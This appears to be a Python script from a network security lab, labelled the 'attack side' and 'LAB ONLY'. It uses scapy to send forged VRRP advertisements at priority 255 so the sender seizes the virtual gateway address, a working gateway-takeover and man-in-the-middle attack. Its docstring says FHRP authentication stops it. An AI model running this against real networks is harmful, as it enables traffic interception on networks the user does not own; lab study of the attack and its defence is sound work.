# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-vrrp-hsrp: preempt the VRRP master. LAB ONLY.

Advertises VRRP priority 255 for the group so the attacker becomes master and
owns the virtual gateway IP/MAC - a gateway takeover / MITM. FHRP authentication
(see fhrp.py) rejects it.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    pkt = s.IP(dst="224.0.0.18", ttl=255, proto=112) / s.VRRP(
        vrid=args.vrid, priority=args.priority, addrlist=[args.vip]
    )
    print(f"[*] advertising VRRP vrid {args.vrid} priority {args.priority} for {args.vip}")
    s.send(pkt, count=args.count, inter=args.interval, verbose=0)
    verdict("ALERT", f"claimed master for VIP {args.vip}")
    return 0
